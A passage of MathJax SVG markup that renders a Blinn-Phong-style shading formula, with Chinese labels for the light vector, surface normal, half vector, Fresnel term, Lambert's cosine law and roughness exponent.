data-mml-node="mo" transform="translate(9287.5,0)"><use data-c="2B" xlink:href="#MJX-1-TEX-N-2B"></use></g><g data-mml-node="mi" transform="translate(10287.7,0)"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="mi" transform="translate(11165.7,0)"><use data-c="1D44E" xlink:href="#MJX-1-TEX-I-1D44E"></use></g><g data-mml-node="mi" transform="translate(11694.7,0)"><use data-c="1D465" xlink:href="#MJX-1-TEX-I-1D465"></use></g><g data-mml-node="mo" transform="translate(12266.7,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="mi" transform="translate(12655.7,0)"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g><g data-mml-node="mo" transform="translate(13558.9,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="mi" transform="translate(14059.1,0)"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mo" transform="translate(14659.1,0)"><use data-c="2C" xlink:href="#MJX-1-TEX-N-2C"></use></g><g data-mml-node="mn" transform="translate(15103.8,0)"><use data-c="30" xlink:href="#MJX-1-TEX-N-30"></use></g><g data-mml-node="mo" transform="translate(15603.8,0)"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="mo" transform="translate(16215,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="msub" transform="translate(16715.2,0)"><g data-mml-node="mi"><use data-c="1D435" xlink:href="#MJX-1-TEX-I-1D435"></use></g><g data-mml-node="TeXAtom" transform="translate(792,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g></g></g><g data-mml-node="mo" transform="translate(18261,0)"><use data-c="2297" xlink:href="#MJX-1-TEX-N-2297"></use></g><g data-mml-node="mo" transform="translate(19261.2,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="msub" transform="translate(19650.2,0)"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="TeXAtom" transform="translate(911,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D451" xlink:href="#MJX-1-TEX-I-1D451"></use></g></g></g><g data-mml-node="mo" transform="translate(21201.1,0)"><use data-c="2B" xlink:href="#MJX-1-TEX-N-2B"></use></g><g data-mml-node="msub" transform="translate(22201.4,0)"><g data-mml-node="mi"><use data-c="1D445" xlink:href="#MJX-1-TEX-I-1D445"></use></g><g data-mml-node="TeXAtom" transform="translate(792,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D439" xlink:href="#MJX-1-TEX-I-1D439"></use></g></g></g><g data-mml-node="mo" transform="translate(23573,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="msub" transform="translate(23962,0)"><g data-mml-node="mi"><use data-c="1D6FC" xlink:href="#MJX-1-TEX-I-1D6FC"></use></g><g data-mml-node="TeXAtom" transform="translate(673,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g></g></g><g data-mml-node="mo" transform="translate(25092.3,0)"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="mfrac" transform="translate(25481.3,0)"><g data-mml-node="mrow" transform="translate(220,398) scale(0.707)"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="mo" transform="translate(878,0)"><use data-c="2B" xlink:href="#MJX-1-TEX-N-2B"></use></g><g data-mml-node="mn" transform="translate(1656,0)"><use data-c="38" xlink:href="#MJX-1-TEX-N-38"></use></g></g><g data-mml-node="mn" transform="translate(805.5,-345) scale(0.707)"><use data-c="38" xlink:href="#MJX-1-TEX-N-38"></use></g><rect width="1724.5" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(27445.8,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="mi" transform="translate(27834.8,0)"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mo" transform="translate(28657,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="mi" transform="translate(29157.2,0)"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g><g data-mml-node="msup" transform="translate(29733.2,0)"><g data-mml-node="mo"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g></g></g><g data-mml-node="mo" transform="translate(30826.1,0)"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="mstyle" transform="translate(31215.1,0)"><g data-mml-node="mspace"></g></g></g></g></g><g data-mml-node="mtr" transform="translate(0,14700)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,13300)"><g data-mml-node="mtd" transform="translate(11850.3,0)"><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g><g data-mml-node="mo" transform="translate(958.8,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(1514.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">指</text></g><g data-mml-node="mi" transform="translate(2514.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">向</text></g><g data-mml-node="mi" transform="translate(3514.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">光</text></g><g data-mml-node="mi" transform="translate(4514.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">源</text></g><g data-mml-node="mi" transform="translate(5514.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">的</text></g><g data-mml-node="mi" transform="translate(6514.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">向</text></g><g data-mml-node="mi" transform="translate(7514.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">量</text></g></g></g><g data-mml-node="mtr" transform="translate(0,11900)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,10500)"><g data-mml-node="mtd" transform="translate(13390.8,0)"><g data-mml-node="mi"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mo" transform="translate(877.8,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(1433.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">表</text></g><g data-mml-node="mi" transform="translate(2433.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">面</text></g><g data-mml-node="mi" transform="translate(3433.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">法</text></g><g data-mml-node="mi" transform="translate(4433.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">线</text></g></g></g><g data-mml-node="mtr" transform="translate(0,9100)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,7700)"><g data-mml-node="mtd" transform="translate(7902.8,0)"><g data-mml-node="mi"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g><g data-mml-node="mo" transform="translate(853.8,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(1409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">光</text></g><g data-mml-node="mi" transform="translate(2409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">向</text></g><g data-mml-node="mi" transform="translate(3409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">量</text></g><g data-mml-node="mi" transform="translate(4409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">和</text></g><g data-mml-node="mi" transform="translate(5409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">观</text></g><g data-mml-node="mi" transform="translate(6409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">察</text></g><g data-mml-node="mi" transform="translate(7409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">向</text></g><g data-mml-node="mi" transform="translate(8409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">量</text></g><g data-mml-node="mi" transform="translate(9409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">之</text></g><g data-mml-node="mi" transform="translate(10409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">间</text></g><g data-mml-node="mi" transform="translate(11409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">的</text></g><g data-mml-node="mi" transform="translate(12409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">中</text></g><g data-mml-node="mi" transform="translate(13409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">间</text></g><g data-mml-node="mi" transform="translate(14409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">向</text></g><g data-mml-node="mi" transform="translate(15409.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">量</text></g></g></g><g data-mml-node="mtr" transform="translate(0,6300)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,4900)"><g data-mml-node="mtd" transform="translate(12033.5,0)"><g data-mml-node="msub"><g data-mml-node="mi"><use data-c="1D434" xlink:href="#MJX-1-TEX-I-1D434"></use></g><g data-mml-node="TeXAtom" transform="translate(783,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g></g></g><g data-mml-node="mo" transform="translate(1592.3,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(2148.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">入</text></g><g data-mml-node="mi" transform="translate(3148.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">射</text></g><g data-mml-node="mi" transform="translate(4148.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">环</text></g><g data-mml-node="mi" transform="translate(5148.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">境</text></g><g data-mml-node="mi" transform="translate(6148.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">光</text></g><g data-mml-node="mi" transform="translate(7148.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">量</text></g></g></g><g data-mml-node="mtr" transform="translate(0,3500)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,2100)"><g data-mml-node="mtd" transform="translate(12029,0)"><g data-mml-node="msub"><g data-mml-node="mi"><use data-c="1D435" xlink:href="#MJX-1-TEX-I-1D435"></use></g><g data-mml-node="TeXAtom" transform="translate(792,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g></g></g><g data-mml-node="mo" transform="translate(1601.3,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(2157.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">入</text></g><g data-mml-node="mi" transform="translate(3157.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">射</text></g><g data-mml-node="mi" transform="translate(4157.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">直</text></g><g data-mml-node="mi" transform="translate(5157.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">射</text></g><g data-mml-node="mi" transform="translate(6157.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">光</text></g><g data-mml-node="mi" transform="translate(7157.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">量</text></g></g></g><g data-mml-node="mtr" transform="translate(0,700)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,-700)"><g data-mml-node="mtd" transform="translate(8026.4,0)"><g data-mml-node="msub"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="TeXAtom" transform="translate(911,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D451" xlink:href="#MJX-1-TEX-I-1D451"></use></g></g></g><g data-mml-node="mo" transform="translate(1606.5,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(2162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">根</text></g><g data-mml-node="mi" transform="translate(3162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">据</text></g><g data-mml-node="mi" transform="translate(4162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">表</text></g><g data-mml-node="mi" transform="translate(5162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">面</text></g><g data-mml-node="mi" transform="translate(6162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">反</text></g><g data-mml-node="mi" transform="translate(7162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">射</text></g><g data-mml-node="mi" transform="translate(8162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">率</text></g><g data-mml-node="mi" transform="translate(9162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">反</text></g><g data-mml-node="mi" transform="translate(10162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">射</text></g><g data-mml-node="mi" transform="translate(11162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">的</text></g><g data-mml-node="mi" transform="translate(12162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">入</text></g><g data-mml-node="mi" transform="translate(13162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">射</text></g><g data-mml-node="mi" transform="translate(14162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">光</text></g><g data-mml-node="mi" transform="translate(15162.3,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">量</text></g></g></g><g data-mml-node="mtr" transform="translate(0,-2100)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,-3500)"><g data-mml-node="mtd" transform="translate(11689,0)"><g data-mml-node="mi"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g><g data-mml-node="mo" transform="translate(903.2,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="mi" transform="translate(1403.4,0)"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mo" transform="translate(2281.2,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(2837,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">朗</text></g><g data-mml-node="mi" transform="translate(3837,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">伯</text></g><g data-mml-node="mi" transform="translate(4837,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">余</text></g><g data-mml-node="mi" transform="translate(5837,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">弦</text></g><g data-mml-node="mi" transform="translate(6837,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">定</text></g><g data-mml-node="mi" transform="translate(7837,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">理</text></g></g></g><g data-mml-node="mtr" transform="translate(0,-4900)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,-6300)"><g data-mml-node="mtd" transform="translate(7997.1,0)"><g data-mml-node="msub"><g data-mml-node="mi"><use data-c="1D6FC" xlink:href="#MJX-1-TEX-I-1D6FC"></use></g><g data-mml-node="TeXAtom" transform="translate(673,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g></g></g><g data-mml-node="mo" transform="translate(1408.1,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(1963.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">中</text></g><g data-mml-node="mi" transform="translate(2963.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">间</text></g><g data-mml-node="mi" transform="translate(3963.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">向</text></g><g data-mml-node="mi" transform="translate(4963.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">量</text></g><g data-mml-node="mi" transform="translate(5963.8,0)"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g><g data-mml-node="mi" transform="translate(6539.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">与</text></g><g data-mml-node="mi" transform="translate(7539.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">光</text></g><g data-mml-node="mi" transform="translate(8539.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">向</text></g><g data-mml-node="mi" transform="translate(9539.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">量</text></g><g data-mml-node="mi" transform="translate(10539.8,0)"><use data-c="1D43F" xlink:href="#MJX-1-TEX-I-1D43F"></use></g><g data-mml-node="mi" transform="translate(11220.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">之</text></g><g data-mml-node="mi" transform="translate(12220.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">间</text></g><g data-mml-node="mi" transform="translate(13220.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">的</text></g><g data-mml-node="mi" transform="translate(14220.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">夹</text></g><g data-mml-node="mi" transform="translate(15220.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">角</text></g></g></g><g data-mml-node="mtr" transform="translate(0,-7700)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,-9100)"><g data-mml-node="mtd" transform="translate(762.8,0)"><g data-mml-node="msub"><g data-mml-node="mi"><use data-c="1D445" xlink:href="#MJX-1-TEX-I-1D445"></use></g><g data-mml-node="TeXAtom" transform="translate(792,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D439" xlink:href="#MJX-1-TEX-I-1D439"></use></g></g></g><g data-mml-node="mo" transform="translate(1371.6,0)"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="msub" transform="translate(1760.6,0)"><g data-mml-node="mi"><use data-c="1D6FC" xlink:href="#MJX-1-TEX-I-1D6FC"></use></g><g data-mml-node="TeXAtom" transform="translate(673,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g></g></g><g data-mml-node="mo" transform="translate(2890.9,0)"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="mo" transform="translate(3557.7,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(4113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">根</text></g><g data-mml-node="mi" transform="translate(5113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">据</text></g><g data-mml-node="mi" transform="translate(6113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">菲</text></g><g data-mml-node="mi" transform="translate(7113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">涅</text></g><g data-mml-node="mi" transform="translate(8113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">尔</text></g><g data-mml-node="mi" transform="translate(9113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">效</text></g><g data-mml-node="mi" transform="translate(10113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">应</text></g><g data-mml-node="mi" transform="translate(11113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(12113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">关</text></g><g data-mml-node="mi" transform="translate(13113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">于</text></g><g data-mml-node="mi" transform="translate(14113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">中</text></g><g data-mml-node="mi" transform="translate(15113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">间</text></g><g data-mml-node="mi" transform="translate(16113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">向</text></g><g data-mml-node="mi" transform="translate(17113.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">量</text></g><g data-mml-node="mi" transform="translate(18113.5,0)"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g><g data-mml-node="mi" transform="translate(18689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">所</text></g><g data-mml-node="mi" transform="translate(19689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">反</text></g><g data-mml-node="mi" transform="translate(20689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">射</text></g><g data-mml-node="mi" transform="translate(21689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">到</text></g><g data-mml-node="mi" transform="translate(22689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">观</text></g><g data-mml-node="mi" transform="translate(23689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">察</text></g><g data-mml-node="mi" transform="translate(24689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">者</text></g><g data-mml-node="mi" transform="translate(25689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">眼</text></g><g data-mml-node="mi" transform="translate(26689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">中</text></g><g data-mml-node="mi" transform="translate(27689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">的</text></g><g data-mml-node="mi" transform="translate(28689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">光</text></g><g data-mml-node="mi" transform="translate(29689.5,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">量</text></g></g></g><g data-mml-node="mtr" transform="translate(0,-10500)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,-11900)"><g data-mml-node="mtd" transform="translate(11751.8,0)"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="mo" transform="translate(1155.8,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(1711.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">控</text></g><g data-mml-node="mi" transform="translate(2711.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">制</text></g><g data-mml-node="mi" transform="translate(3711.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">表</text></g><g data-mml-node="mi" transform="translate(4711.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">面</text></g><g data-mml-node="mi" transform="translate(5711.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">粗</text></g><g data-mml-node="mi" transform="translate(6711.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">糙</text></g><g data-mml-node="mi" transform="translate(7711.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">度</text></g></g></g><g data-mml-node="mtr" transform="translate(0,-13300)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,-14700)"><g data-mml-node="mtd" transform="translate(933,0)"><g data-mml-node="mo"><use data-c="28" xlink:href="#MJX-1-TEX-N-28"></use></g><g data-mml-node="mi" transform="translate(389,0)"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mo" transform="translate(1211.2,0)"><use data-c="22C5" xlink:href="#MJX-1-TEX-N-22C5"></use></g><g data-mml-node="mi" transform="translate(1711.4,0)"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g><g data-mml-node="msup" transform="translate(2287.4,0)"><g data-mml-node="mo"><use data-c="29" xlink:href="#MJX-1-TEX-N-29"></use></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g></g></g><g data-mml-node="mo" transform="translate(3658.1,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mi" transform="translate(4213.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">指</text></g><g data-mml-node="mi" transform="translate(5213.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">定</text></g><g data-mml-node="mi" transform="translate(6213.8,0)"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g><g data-mml-node="mi" transform="translate(6789.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">和</text></g><g data-mml-node="mi" transform="translate(7789.8,0)"><use data-c="1D45B" xlink:href="#MJX-1-TEX-I-1D45B"></use></g><g data-mml-node="mi" transform="translate(8389.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">之</text></g><g data-mml-node="mi" transform="translate(9389.8,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">间</text></g><g data-mml-node="msub" transform="translate(10389.8,0)"><g data-mml-node="mi"><use data-c="1D703" xlink:href="#MJX-1-TEX-I-1D703"></use></g><g data-mml-node="TeXAtom" transform="translate(502,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use data-c="210E" xlink:href="#MJX-1-TEX-I-210E"></use></g></g></g><g data-mml-node="mi" transform="translate(11349.1,0)"><text data-variant="italic" 